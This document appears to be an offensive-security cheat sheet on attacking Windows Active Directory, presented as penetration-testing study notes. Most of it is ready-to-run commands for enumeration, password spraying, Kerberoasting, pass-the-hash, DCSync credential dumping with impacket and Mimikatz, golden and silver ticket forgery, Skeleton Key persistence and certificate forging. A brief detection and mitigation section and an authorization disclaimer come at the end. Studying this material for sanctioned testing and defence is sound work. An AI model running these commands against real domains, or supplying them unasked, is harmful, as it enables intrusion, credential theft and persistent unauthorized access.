# Active Directory Exploitation - OffSec

## Overview
This guide covers advanced Active Directory exploitation techniques, including reconnaissance, lateral movement, and privilege escalation in Windows domain environments.

## AD Fundamentals

### Key Components
- **Domain Controller (DC)**: Central authentication server
- **Domain Services**: Authentication, authorization, and directory services
- **Kerberos**: Authentication protocol
- **LDAP**: Directory service protocol
- **SMB**: File and printer sharing protocol

### Common Attack Vectors
1. **Credential Theft**
2. **Pass-the-Hash (PtH)**
3. **Pass-the-Ticket (PtT)**
4. **Golden Ticket**
5. **Silver Ticket**
6. **DCSync Attack**
7. **Kerberoasting**
8. **ASREPRoasting**

## Reconnaissance

### Initial Enumeration
```bash
# Domain information
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com

# User enumeration
enum4linux -U domain.com
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers

# Group enumeration
rpcclient $> enumdomgroups
```

### LDAP Enumeration
```bash
# Using ldapsearch
ldapsearch -x -H ldap://10.10.10.10 -D "CN=user,CN=Users,DC=domain,DC=com" -w password -b "DC=domain,DC=com"

# Using ldapdomaindump
ldapdomaindump -u domain\\user -p password 10.10.10.10
```

### SMB Enumeration
```bash
# Share enumeration
smbclient -L //10.10.10.10 -U ""

# Null session enumeration
enum4linux -a 10.10.10.10
```

## Credential Attacks

### Password Spraying
```bash
# Using crackmapexec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123!'

# Using hydra
hydra -L users.txt -p 'Password123!' smb://10.10.10.10
```

### ASREPRoasting
```bash
# Using impacket
python3 GetNPUsers.py domain.com/ -usersfile users.txt -dc-ip 10.10.10.10

# Using Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

### Kerberoasting
```bash
# Using impacket
python3 GetUserSPNs.py domain.com/user:password@10.10.10.10 -dc-ip 10.10.10.10

# Using Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
```

## Lateral Movement

### Pass-the-Hash
```bash
# Using crackmapexec
crackmapexec smb 10.10.10.10 -u user -H aad3b435b51404eeaad3b435b51404ee:hash

# Using pth-winexe
pth-winexe -U domain/user%aad3b435b51404eeaad3b435b51404ee:hash //10.10.10.10 cmd
```

### Pass-the-Ticket
```bash
# Using impacket
python3 psexec.py domain.com/user@10.10.10.10 -k

# Using Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

### WMI Execution
```bash
# Using impacket
python3 wmiexec.py domain.com/user:password@10.10.10.10

# Using crackmapexec
crackmapexec wmi 10.10.10.10 -u user -p password -x "whoami"
```

## Privilege Escalation

### Token Impersonation
```powershell
# Using incognito
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"

# Using Rubeus
Rubeus.exe s4u /user:service /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/target.domain.com
```

### DCSync Attack
```bash
# Using impacket
python3 secretsdump.py domain.com/user:password@10.10.10.10

# Using Mimikatz
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
```

### Golden Ticket
```bash
# Using impacket
python3 ticketer.py -nthash krbtgt_hash -domain-sid domain_sid -domain domain.com Administrator

# Using Mimikatz
mimikatz # kerberos::golden /domain:domain.com /sid:domain_sid /krbtgt:krbtgt_hash /user:Administrator
```

## Advanced Techniques

### BloodHound Enumeration
```bash
# Using SharpHound
SharpHound.exe -c All -d domain.com

# Using BloodHound Python
bloodhound-python -u user -p password -d domain.com -dc 10.10.10.10 -c all
```

### ACL Abuse
```powershell
# Using PowerView
Add-DomainObjectAcl -TargetIdentity "CN=user,CN=Users,DC=domain,DC=com" -PrincipalIdentity "CN=attacker,CN=Users,DC=domain,DC=com" -Rights DCSync

# Using PowerSploit
Invoke-ACLScanner -ResolveGUIDs
```

### Certificate Attacks
```bash
# Using Certipy
certipy find -u user@domain.com -p password -dc-ip 10.10.10.10

# Using ForgeCert
ForgeCert.exe --CertPath cert.pem --KeyPath key.pem --SavePath forged.pfx --Password password
```

## Persistence Techniques

### Golden Ticket
```bash
# Creating persistent access
python3 ticketer.py -nthash krbtgt_hash -domain-sid domain_sid -domain domain.com -user-id 500 Administrator
```

### Silver Ticket
```bash
# Service ticket creation
python3 ticketer.py -nthash service_hash -domain-sid domain_sid -domain domain.com -spn service/target.domain.com Administrator
```

### Skeleton Key
```bash
# Using Mimikatz
mimikatz # misc::skeleton
```

## Detection and Mitigation

### Detection Techniques
1. **Event Log Monitoring**
   - Failed authentication attempts
   - Privilege escalation events
   - Unusual network activity

2. **Network Monitoring**
   - Kerberos ticket anomalies
   - SMB traffic analysis
   - LDAP query monitoring

3. **Endpoint Detection**
   - Process monitoring
   - Memory analysis
   - Registry changes

### Mitigation Strategies
1. **Access Control**
   - Principle of least privilege
   - Regular access reviews
   - Strong password policies

2. **Network Security**
   - Network segmentation
   - Firewall rules
   - VPN requirements

3. **Monitoring**
   - SIEM implementation
   - Log aggregation
   - Threat hunting

## Tools and Resources

### Essential Tools
- **Impacket**: Python tools for AD exploitation
- **CrackMapExec**: Swiss army knife for AD
- **BloodHound**: AD attack path visualization
- **Mimikatz**: Credential dumping and manipulation
- **Rubeus**: Kerberos exploitation toolkit

### Additional Resources
- **PowerView**: PowerShell AD enumeration
- **PowerSploit**: PowerShell exploitation framework
- **Empire**: Post-exploitation framework
- **Cobalt Strike**: Commercial penetration testing platform

## Conclusion
Active Directory exploitation requires deep understanding of Windows authentication mechanisms and domain architecture. Focus on understanding the attack paths and implementing proper detection mechanisms. Always practice in isolated lab environments and follow responsible disclosure practices.

---
*This guide covers advanced AD exploitation techniques. Ensure you have proper authorization before testing these techniques in any environment.*
